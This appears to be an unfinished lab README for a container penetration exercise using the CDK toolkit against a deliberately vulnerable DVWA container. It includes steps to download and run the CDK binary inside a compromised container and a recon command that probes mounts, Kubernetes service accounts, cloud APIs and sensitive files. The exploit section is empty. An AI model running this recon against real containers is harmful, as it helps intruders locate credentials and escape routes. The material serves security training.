# cdk (Zero Dependency Container Penetration Toolkit)
https://github.com/cdk-team/CDK


## Setup the virtual machine
```/bin/bash
vagrant up
vagrant ssh
cd /vagrant
sudo docker-compose up -d
```


## Setup cdk
```/bin/bash
# Let's assume that you've exploited the application and dropped into the container's shell
sudo docker exec -it web-dvwa /bin/bash

# Time to set up the toolkit
apt-get update
apt-get install wget -Y
wget https://github.com/cdk-team/CDK/releases/download/v0.1.10/cdk_linux_386
chmod +x cdk_linux_386
alias cdk='/cdk_linux_386' 
```


## Recon / Evaluation
system info, services, commands, mounts, net namespaces, sysctl variables, k8s api server, k8s service account, cloud provider api, sensitive files

```/bin/bash
cdk evaluate --full
```


## Exploit
```/bin/bash
```

Educational Links:
https://www.educba.com/docker-privileged/
https://iximiuz.com/en/posts/implementing-container-runtime-shim/



## Network tools

